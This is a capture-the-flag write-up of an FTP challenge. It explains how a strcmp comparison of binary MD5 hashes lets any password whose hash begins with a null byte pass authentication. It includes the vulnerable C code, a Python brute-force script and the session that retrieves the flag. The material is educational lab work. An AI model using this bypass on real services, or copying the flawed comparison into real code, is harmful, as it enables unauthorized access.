# pwn/ftp1

The first part of the FTP challenge requires you to bypass the authentication allow reading of files.

The auth handling code looks like this:

```c

unsigned char admin_hash[16] = {0x00, 0x40, 0x7d, 0xc8, 0x10, 0xd4, 0x38, 0x79,
                                0xe4, 0x0a, 0x42, 0x63, 0xab, 0x21, 0x40, 0x61};
// ...
bool handle_auth(int fd, char *password) {
  DBG("Handling password %s", password);
  char *hash = md5(password, strlen(password));

  if (!hash || strcmp(hash, admin_hash))
    goto err;

  return true;

err:
  send_str(fd, "INVALID PASSWORD");
  return false;
}
```

Notably, `strcmp` is used to compare the password hash with the admin password hash. The `admin_hash` also starts with a null byte.

Since C-strings are null terminated, `strcmp` will stop at the first null byte when comparing. This means that if we find any password which has an md5 hash starting with a null byte, the check will pass. You can generate one with a script like this:

```py
from hashlib import md5
from itertools import product
from string import ascii_lowercase as chars

for p_tuple in product(chars, repeat=3):
    password_bytes = "".join(p_tuple).encode("utf-8")

    if md5(password_bytes).digest()[0] == 0:
        print("".join(p_tuple))
        exit()

print("Unlucky")
```

```bash
$ python3 x1.py
abz
```

We can then read the flag as so:

```
> AUTH abz
> GET flag1.txt
EMU{oops_i_forgot_about_NULL_bytes}
```
